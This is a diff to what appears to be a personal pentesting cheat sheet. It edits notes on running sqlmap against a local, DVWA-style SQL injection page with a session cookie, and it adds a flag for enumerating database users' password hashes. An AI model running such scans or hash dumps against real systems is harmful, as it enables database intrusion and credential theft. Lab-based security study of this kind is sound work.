@@ -551,10 +551,10 @@ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev		# cl
 
 python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=555&Submit=Submit#" --cookie="<COOKIE/SESSION_ID_1>; <COOKIE/SESSION_ID_N" --tables --batch
 
---batch 			# this will choose the default options when running a scan 
---schema 			# enumerate the DB schema
---tables 			# enumerate the DB tables
-
+--batch 			# !!! this will choose the default options when running a scan . Best not to use as it may start trying to crack password
+--schema 			# Enumerate the DB schema
+--tables 			# Enumerate the DB tables
+--password			# Enumerate DBMS users password hashes
 ```
 ## node
 
